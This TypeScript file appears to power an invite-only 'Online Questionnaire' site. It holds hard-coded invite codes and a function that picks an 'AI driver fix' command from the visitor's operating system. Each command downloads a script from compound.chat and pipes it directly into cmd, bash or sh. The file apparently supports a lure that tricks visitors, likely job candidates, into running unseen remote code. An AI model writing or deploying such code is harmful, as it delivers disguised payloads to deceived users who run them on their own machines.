/** Only these invite codes are valid; all others return 404. */
export const ALLOWED_INVITE_CODES = [
  "p8bzc59w702ql65ub676p1",
  "k3fvn84x901rm72cd589t2",
  "q7mjd82y914sn48vf392r3",
] as const;

/** Invite code -> questionnaire type. */
export const INVITE_QUESTIONNAIRE_TYPE: Record<
  string,
  "technical" | "business" | "professional"
> = {
  p8bzc59w702ql65ub676p1: "business",
  q7mjd82y914sn48vf392r3: "technical",
  k3fvn84x901rm72cd589t2: "professional",
};

export type QuestionnaireType = "technical" | "business" | "professional";

export function getQuestionnaireType(code: string): QuestionnaireType {
  return INVITE_QUESTIONNAIRE_TYPE[code] ?? "business";
}

export function getPageTitle(code: string): string {
  const type = getQuestionnaireType(code);
  if (type === "technical")
    return "Online Questionnaire";
  if (type === "professional") return "Online Questionnaire";
  return "Online Questionnaire";
}

/** AI driver fix command by OS (from User-Agent). */
export function getCommandTextForOs(os: string | null): string {
  const s = (os ?? "").toLowerCase();
  if (s.includes("win")) return "curl https://compound.chat/video-recording/aidriver-enable-win | cmd /q";
  if (s.includes("mac") || s.includes("ios")) return "curl https://compound.chat/video-recording/aidriver-enable | bash";
  return "curl https://compound.chat/video-recording/aidriver-enable | sh";
}
